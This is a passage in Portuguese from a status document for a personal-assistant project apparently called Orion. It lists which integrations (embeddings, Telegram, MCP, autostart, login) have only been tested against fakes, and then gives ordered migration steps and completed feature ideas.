- **Formato do export real:** `verify-export` e o importador foram testados com exports sintéticos montados a partir do
  código do legado (`backup_memoria` = `SELECT *` de cada tabela de `INFO FOR DB`). Os campos `in`/`out` das relações
  `precedeu`/`sobre`/`conecta` são os padrões do `RELATE` do SurrealDB, mas **nunca vi um export real**: se não baterem, o
  relatório mostra as arestas como "sem nó" em vez de importar. Rode o `verify-export` no PC antes de vender.
- **Embeddings:** o `GeminiEmbedder` fala o formato `batchEmbedContents` (cabeçalho `x-goog-api-key`, `taskType`,
  `outputDimensionality`) por memória da documentação e foi testado só contra uma API falsa. Primeira chamada real é sua:
  confira modelo, dimensão e a cota do plano gratuito.
- **Consolidação:** testada com um modelo falso. Com um modelo real o formato JSON pode vir fora do esperado (a rodada
  falha sem avançar a marca e tenta de novo) e a qualidade dos fatos precisa de olho humano (`MemoryStore.facts_markdown()` gera a nota para conferir e corrigir).
- **Jobs em tempo real:** testados com relógio falso e com o laço cancelado/retomado; não há teste de dias de uptime.
  O disparo de agendamento **só avisa** (regra 18); a entrega ao celular é o canal Telegram novo lendo a fila.
- **Telegram real:** o canal foi testado só contra uma API falsa (formato de `getUpdates`, `sendMessage`, `answerCallbackQuery`,
  `editMessageReplyMarkup` e `callback_data` por memória da documentação). Primeira mensagem real é sua.
- **Autostart:** os arquivos do Windows (`.cmd` em Startup), macOS (LaunchAgent) e Linux (unit de usuário) são gerados e
  validados como texto (o plist é lido por `plistlib`); nenhum foi ativado no sistema de verdade.
- **`orion-desktop` v0:** o shell real só foi executado no Linux; no Windows (PowerShell) só o argv é testado. Desligado por padrão.
- **Legado em produção:** o gate novo foi testado com stubs, não com Qdrant/SurrealDB no ar. **Antes de usar no PC,
  suba o cérebro e faça um pedido que rode `executar_comando`** — agora ele vai pedir confirmação em quase tudo
  que não for leitura (esse é o comportamento desejado, mas muda o uso).
- **Modelos reais:** nenhum gateway real foi chamado; o formato é o da OpenAI (OmniRoute o fala), mas o primeiro
  teste ao vivo é seu.
- **Embeddings reais:** a busca vetorial foi testada com um embedder falso (sinônimos). Falta o cliente da API
  gratuita (Gemini) e medir com suas perguntas reais — o conjunto de avaliação existe para isso.
- **Front:** testado no Chromium (fluxos, teclado, axe nas telas e na tela de entrada); não testei dentro do pywebview
  nem o grafo 3D. O casco desktop do legado (pywebview) entra por token (`get_config`); o desktop do Orion novo é o navegador com senha (V9–V13, item e).
- **Login em uso real:** testado com cliente de teste e Chromium; não testei atrás do `tailscale serve` (HTTPS). Lá o
  endereço do cliente que o servidor vê é sempre `127.0.0.1`, então o bloqueio por cliente vira um bloqueio global.
- **MCP:** testado com um servidor de verdade (o do próprio SDK) por stdin/stdout em Linux. Os pacotes e os nomes de
  ferramentas do `mcp.example.json` (filesystem, fetch, git, Playwright) são de memória: rode `orion mcp-check`.
  Nenhum servidor de Google Workspace foi escolhido.
- **Voz e foto no Telegram:** só contra API falsa. O formato de `getFile` e do `audio/transcriptions` do Groq é por
  memória da documentação. A foto só funciona se o modelo do gateway aceitar imagem.
- **`pesquisar_com_ia`:** o formato do `generateContent` com `google_search` e o nome do modelo (`gemini-2.5-flash`)
  são de memória e não foram testados contra a API real.
- **Ferramentas do desktop no Windows e no macOS:** notificação (balão do PowerShell, `osascript`), área de transferência,
  abrir app e processos em segundo plano só têm o argv testado nesses sistemas; os comandos reais rodaram no Linux.
- O REST do **legado** continua sem login (o legado sai na fase 7); o `/mcp` dele agora recusa página de navegador de outro site e o `Host` é conferido (V10), mas o CORS ainda tolera `Origin: null` na API normal por causa do pywebview.

## Próximos passos (em ordem)

1. **Fase 0, agora:** `backup_memoria` no PC, copiar `.env` e `Orion_Core/google_auth/`, conferir o vault, e rodar
   `orion verify-export` até dar `PRONTO` ([ORION_CORTE.md](ORION_CORTE.md) §2).
2. Rodar `uv sync && uv run pytest` na sua máquina.
3. `orion import-surreal <pasta-do-backup> --assistente <nome-antigo>` e escrever 15–30 perguntas reais em
   `tests/eval_pessoal.local.json` (modelo em `tests/eval_pessoal.example.json`); medir com
   `python -m orion.memory.eval <casos> --db <orion.db> --embeddings --min-hit-rate 0.8`.
4. Subir o OmniRoute e testar `ORION_GATEWAY_URL`/`ORION_GATEWAY_MODEL` com `POST /chat`.
5. Fase 5: `uv run orion set-password`; criar o bot (@BotFather), preencher `ORION_TELEGRAM_TOKEN`/`ORION_TELEGRAM_ALLOWED_USERS`
   (e `ORION_TRANSCRIBE_API_KEY` para voz) e testar no notebook (pare o bot do legado antes); instalar o Tailscale
   ([ORION_OPERACAO.md](ORION_OPERACAO.md)); `uv run orion autostart`.
6. Fase 4: copiar `mcp.example.json` para `mcp.json`, ligar os servidores que quiser e conferir com `uv run orion mcp-check`;
   ligar `ORION_DESKTOP_TOOLS` (e, se quiser, `ORION_WEB_TOOLS`). O que ainda falta de cada ferramenta está em
   [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md).
7. Decidir o que o [plano de corte](ORION_CORTE.md) deixa em aberto (data da venda, ferramentas mínimas, dias em paralelo).

## Ideias que sobraram (valor/custo)

- ~~Palavra de ativação "Orion"~~ (feito em 07/10: `orion/wake.py`; falta testar com o microfone real e, se quiser o openWakeWord, gerar o modelo).

- ~~Briefing matinal no Telegram~~ (feito em 06/10: lembretes, agendamentos e tarefas; a agenda do Google entra desde 07/10, regra 37, depois de ligar o servidor `google`).
- ~~Captura rápida~~ (feito em 06/10: `/capturar`; o link é guardado como veio, sem buscar o título da página).
- ~~Painel único~~ (feito em 06/10: `GET /painel`, tela Painel, `/painel` no Telegram; a cota **real** por provedor ainda exige consultar o OmniRoute).
- ~~Roteamento por tipo de tarefa~~ (feito em 07/10: `orion/router.py`, V11).
- ~~Front no celular / PWA~~ (descartado em 07/10: front só desktop, decisão #5).
- ~~Consolidação noturna da memória~~ (feito em 03/10: `orion/memory/consolidate.py`).
